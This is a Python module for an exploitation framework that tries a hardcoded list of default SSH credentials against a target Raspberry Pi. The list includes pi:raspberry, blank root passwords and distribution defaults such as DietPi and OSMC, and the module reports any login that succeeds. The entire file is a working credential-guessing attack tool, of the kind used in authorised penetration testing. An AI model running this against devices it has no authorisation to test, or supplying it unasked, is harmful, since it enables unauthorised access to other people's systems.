# Author: André Henrique (LinkedIn/X: @mrhenrike)
"""Raspberry Pi — Default SSH Credentials.

Attempts SSH authentication using known Raspberry Pi default credentials.

Version: 1.0.0
"""

from embedxpl.core.exploit import *
from embedxpl.core.ssh.ssh_client import SSHClient, SSHCli

_DEFAULT_CREDENTIALS = [
    ("pi", "raspberry"),
    ("pi", ""),
    ("root", ""),
    ("root", "root"),
    ("root", "toor"),
    ("admin", "admin"),
    ("ubuntu", "ubuntu"),
    ("dietpi", "dietpi"),
    ("alarm", "alarm"),
    ("osmc", "osmc"),
    ("kodi", "osmc"),
]


class Exploit(SSHClient):
    """Raspberry Pi Default SSH Credentials.

    Attempts SSH authentication against Raspberry Pi devices using known
    manufacturer default credentials: pi:raspberry and other common passwords.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Raspberry Pi Default SSH Credentials",
        "description": (
            "Attempts SSH authentication against Raspberry Pi devices using known "
            "default credentials including pi:raspberry, root: (blank), and "
            "distribution-specific defaults (Ubuntu, DietPi, OSMC, Arch ARM)."
        ),
        "authors": ("André Henrique (@mrhenrike)",),
        "references": (
            "https://www.raspberrypi.org/documentation/",
        ),
        "devices": (
            "Raspberry Pi (Raspbian)", "Raspberry Pi (Ubuntu Server)",
            "Raspberry Pi (DietPi)", "Raspberry Pi (OSMC)", "Raspberry Pi (Arch ARM)",
        ),
    }

    target = OptIP("", "Target IPv4 address")
    port = OptPort(22, "SSH port")
    stop_on_success = OptBool(True, "Stop after first valid credential pair")

    def run(self) -> None:
        print_status(
            "Trying default SSH credentials on {}:{}...".format(self.target, self.port)
        )
        found = False
        for username, password in _DEFAULT_CREDENTIALS:
            try:
                cli = SSHCli(self.target, self.port)
                result = cli.login(username, password)
                if result:
                    display_pass = password if password else "(blank)"
                    print_success(
                        "Valid credentials: {}:{}".format(username, display_pass)
                    )
                    found = True
                    if self.stop_on_success:
                        return
                else:
                    display_pass = password if password else "(blank)"
                    print_status("  {}:{} — failed".format(username, display_pass))
            except Exception as e:
                print_status("  {}:{} — error: {}".format(username, password, e))

        if not found:
            print_error("No default credentials accepted")

    @mute
    def check(self) -> bool:
        import socket
        try:
            with socket.create_connection((self.target, self.port), timeout=3):
                return True
        except Exception:
            return False
